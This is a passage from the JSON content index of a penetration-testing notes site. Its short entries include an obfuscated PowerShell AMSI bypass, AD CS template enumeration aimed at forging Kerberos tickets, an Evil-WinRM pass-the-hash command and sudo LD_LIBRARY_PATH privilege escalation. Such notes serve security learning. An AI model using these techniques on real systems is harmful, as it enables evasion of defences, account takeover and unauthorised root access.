style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.Split&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;forEach&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;char&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]([&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;convert&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;::toint16&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;16&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;))}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;forEach&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;result&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;result&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;+$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;};$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;result&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;))&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.GetField&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.Split&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;forEach&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;char&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]([&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;convert&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;::toint16&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;16&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;))}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;forEach&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;{$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;result2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;result2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;+$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;_&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;};$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;result2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;NonPublic,Static&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.SetValue&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;($&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;true&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Be aware that AMSI bypasses are &lt;em&gt;per session&lt;/em&gt;, not global!&lt;/p&gt;"},"spells/Easy-reverse-DNS-lookups":{"slug":"spells/Easy-reverse-DNS-lookups","filePath":"spells/Easy reverse DNS lookups.md","title":"Easy reverse DNS lookups","links":[],"tags":["AttackCycle/Reconnaissance","Protocol/DNS"],"content":"The nip.io service can be used to provide a domain name for an arbitrary IP address.","richContent":"&lt;p&gt;The &lt;a href=&quot;https://nip.io/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;nip.io&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; service can be used to provide a domain name for an arbitrary IP address.&lt;/p&gt;"},"spells/Enumerate-AD-CS-templates-with-CertUtil":{"slug":"spells/Enumerate-AD-CS-templates-with-CertUtil","filePath":"spells/Enumerate AD CS templates with CertUtil.md","title":"Enumerate AD CS templates with CertUtil","links":["spells/Kerberos","spells/Rubeus"],"tags":["HowTo","Application/CertUtil","OS/Windows/ActiveDirectory","AttackCycle/Reconnaissance","Protocol/Kerberos","Application/Rubeus"],"content":"AD CS is AD’s PKI, and is used on the back end for everything from provisioning disk encryption keys to user authentication. Certificate templates are a way to automate the certificate request process: Rather than an admin approving all CSRs manually, AD CS checks to see if a relevant “template” (which is really a template + associated settings + an access policy) exists that matches the supplied CSR and is configured to allow the requesting user to generate a certificate.\nEnumerate all certificate templates from a domain-joined computer and domain-authenticated user:\ncertutil -v -template\n\nWe need to be able to actually request a certificate. This is indicated by an Allow Enroll or Allow Full Control permission that has been assigned to a group or user you have access to.\nThe certificate needs to be usable for Kerberos authentication. This is true when the “Enhanced Key Usage” extension allows for “Client Authentication”.\nWe need to be able to set the certificate’s “Subject Alternative Name”. This is indicated by TemplatePropSubjectNameFlags (a.k.a. CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) being set to 1.\n\n(There are actually some other requirements — like fully automated certificate provisioning — but by default these are all satisfied.)\nIf a certificate has the above properties, then we can use it to create a certificate in the name of another user and then forge Kerberos tickets for that user with a tool like Rubeus.","richContent":"&lt;p&gt;AD CS is AD’s PKI, and is used on the back end for everything from provisioning disk encryption keys to user authentication. Certificate templates are a way to automate the certificate request process: Rather than an admin approving all CSRs manually, AD CS checks to see if a relevant “template” (which is really a template + associated settings + an access policy) exists that matches the supplied CSR and is configured to allow the requesting user to generate a certificate.&lt;/p&gt;\n&lt;p&gt;Enumerate all certificate templates from a domain-joined computer and domain-authenticated user:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;certutil &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;v &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;template&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;ul&gt;\n&lt;li&gt;We need to be able to actually request a certificate. This is indicated by an &lt;code&gt;Allow Enroll&lt;/code&gt; or &lt;code&gt;Allow Full Control&lt;/code&gt; permission that has been assigned to a group or user you have access to.&lt;/li&gt;\n&lt;li&gt;The certificate needs to be usable for &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt; authentication. This is true when the “Enhanced Key Usage” extension allows for “Client Authentication”.&lt;/li&gt;\n&lt;li&gt;We need to be able to set the certificate’s “Subject Alternative Name”. This is indicated by TemplatePropSubjectNameFlags (a.k.a. &lt;code&gt;CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT&lt;/code&gt;) being set to 1.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;(There are actually some other requirements — like fully automated certificate provisioning — but &lt;em&gt;by default&lt;/em&gt; these are all satisfied.)&lt;/p&gt;\n&lt;p&gt;If a certificate has the above properties, then we can &lt;a href=&quot;https://posts.specterops.io/certified-pre-owned-d95910965cd2&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;use it to create a certificate in the name of another user&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; and then &lt;em&gt;forge&lt;/em&gt; &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt; tickets for that user with a tool like &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Rubeus&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Rubeus&quot;&gt;Rubeus&lt;/a&gt;.&lt;/p&gt;"},"spells/Equivalent-Windows-and-UNIX-commands":{"slug":"spells/Equivalent-Windows-and-UNIX-commands","filePath":"spells/Equivalent Windows and UNIX commands.md","title":"Equivalent Windows and *NIX commands","links":["spells/cat","spells/dig","spells/nslookup","spells/grep","spells/findstr","spells/ipconfig","spells/dir","spells/more","spells/netstat","spells/ping","spells/sudo","spells/RunAs","spells/tcpdump","spells/whoami"],"tags":["OS/AIX","OS/Linux","OS/macOS","OS/Android","OS/Windows","Application/cat","Application/type","Application/dig","Application/nslookup","Application/grep","Application/findstr","Application/select","Application/ifconfig","Application/ipconfig","Application/ls","Application/dir","Application/more","Application/netstat","Application/ping","Application/shutdown","Application/sleep","Application/timeout","Application/sudo","Application/RunAs","Application/tcpdump","Application/windump","Application/traceroute","Application/tracert","Application/wget","Application/whoami","Application/hostname","Language/Bash","Application/cmd"],"content":"*NIX ↔ Windows command equivalencies (more-or-less):\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n*NIXWindowscattypedignslookupgrepfindstr / selectifconfigipconfiglsdirmoremorenetstatnetstatpingpingshutdownshutdownsleeptimeoutsudoRunAstcpdumpwindumptraceroutetracertwgetwgethostnamehostnamewhoamiwhoami\nYou can also manipulate command input and output in a similar fashion:\n\nRedirect to a file: &gt;\nPipe the output of one command into another: |\nRun commands in sequence, stopping at the first failure: &amp; (Windows) or &amp;&amp; (*NIX)\n","richContent":"&lt;p&gt;*NIX ↔ Windows command equivalencies (more-or-less):&lt;/p&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th align=&quot;right&quot;&gt;*NIX&lt;/th&gt;&lt;th align=&quot;left&quot;&gt;Windows&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/cat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/cat&quot;&gt;cat&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://superuser.com/questions/434870/what-is-the-windows-equivalent-of-the-unix-command-cat#434876&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;type&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/dig&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/dig&quot;&gt;dig&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/nslookup&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/nslookup&quot;&gt;nslookup&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/grep&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/grep&quot;&gt;grep&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/findstr&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/findstr&quot;&gt;findstr&lt;/a&gt; / select&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;ifconfig&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ipconfig&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ipconfig&quot;&gt;ipconfig&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;ls&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/dir&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/dir&quot;&gt;dir&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/more&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/more&quot;&gt;more&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;more&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netstat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netstat&quot;&gt;netstat&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netstat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netstat&quot;&gt;netstat&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ping&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ping&quot;&gt;ping&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ping&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ping&quot;&gt;ping&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;shutdown&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;shutdown&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;sleep&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;timeout&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/RunAs&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/RunAs&quot;&gt;RunAs&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/tcpdump&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/tcpdump&quot;&gt;tcpdump&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;windump&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;traceroute&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;tracert&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;wget&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;wget&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;hostname&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;hostname&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/whoami&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/whoami&quot;&gt;whoami&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/whoami&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/whoami&quot;&gt;whoami&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n&lt;p&gt;You can also manipulate command input and output in a similar fashion:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Redirect to a file: &lt;code&gt;&gt;&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;Pipe the output of one command into another: &lt;code&gt;|&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;Run commands in sequence, stopping at the first failure: &lt;code&gt;&amp;#x26;&lt;/code&gt; (Windows) or &lt;code&gt;&amp;#x26;&amp;#x26;&lt;/code&gt; (*NIX)&lt;/li&gt;\n&lt;/ul&gt;"},"spells/Evil-WinRM":{"slug":"spells/Evil-WinRM","filePath":"spells/Evil-WinRM.md","title":"Evil-WinRM","links":[],"tags":["Application/Evil-WinRM","AttackCycle/LateralMovement","Cryptography/Hashes/NT","Protocol/WinRM"],"content":"evil-winrm -i $TARGET_HOST \\\n           -u $TARGET_USER \\\n           -H $TARGET_USER_NTLM_HASH\nThis requires that you already have the target user’s NTLM hash, obviously.\nNote that Evil-WinRM does have a built-in download command for transferring files, but it’s sloooow…","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;evil-winrm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;           -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $TARGET_USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;           -H&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $TARGET_USER_NTLM_HASH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This requires that you already have the target user’s NTLM hash, obviously.&lt;/p&gt;\n&lt;p&gt;Note that Evil-WinRM &lt;em&gt;does&lt;/em&gt; have a built-in download command for transferring files, but it’s &lt;em&gt;sloooow&lt;/em&gt;…&lt;/p&gt;"},"spells/Exploit-LD_LIBRARY_PATH":{"slug":"spells/Exploit-LD_LIBRARY_PATH","filePath":"spells/Exploit LD_LIBRARY_PATH.md","title":"Exploit LD_LIBRARY_PATH","links":["spells/sudo","spells/Exploit-LD_PRELOAD"],"tags":["HowTo","OS/Linux","AttackCycle/Exploitation","Application/sudo","Application/ldd"],"content":"If LD_LIBRARY_PATH is preserved by sudo, then it’s possible to use a malicious dynamic library to gain root access. Preserved environment variables are listed by “sudo -l”.\nUse ldd to see what libraries a program is already pulling in, and then name your malicious library after one of these. Then run sudo LD_LIBRARY_PATH=/path/to/malicious/library program-runnable-with-nopasswd to trick the program into loading your malicious library instead of the legitimate system library.\nWhile the same code as LD_PRELOAD can be used as a starting point for an LD_LIBRARY_PATH exploit, things get trickier because some libraries are required by others, loaded at different times, or have functions (symbols) that are loaded but not used right away. So some amount of trial-and-error, both in the naming of the malicious library and in what functions are defined within it, may be required.\n\n\n                  \n                  Important\n                  \n                \n\n\nNot every UNIX-like system calls their library path LD_LIBRARY_PATH!\n\n\n","richContent":"&lt;p&gt;If &lt;code&gt;LD_LIBRARY_PATH&lt;/code&gt; is preserved by &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt;, then it’s possible to use a malicious dynamic library to gain root access. &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;Preserved environment variables are listed by “sudo -l”.&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;a href=&quot;https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Use ldd to see what libraries a program is already pulling in&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, and then name your malicious library after one of these. Then run &lt;code&gt;sudo LD_LIBRARY_PATH=/path/to/malicious/library program-runnable-with-nopasswd&lt;/code&gt; to trick the program into loading your malicious library instead of the legitimate system library.&lt;/p&gt;\n&lt;p&gt;While the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-LD_PRELOAD&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Exploit-LD_PRELOAD&quot;&gt;same code as LD_PRELOAD&lt;/a&gt; can be used as a starting point for an &lt;code&gt;LD_LIBRARY_PATH&lt;/code&gt; exploit, things get trickier because some libraries are required by others, loaded at different times, or have functions (symbols) that are loaded but not used right away. So some amount of trial-and-error, both in the naming of the malicious library and in what functions are defined within it, may be required.&lt;/p&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div 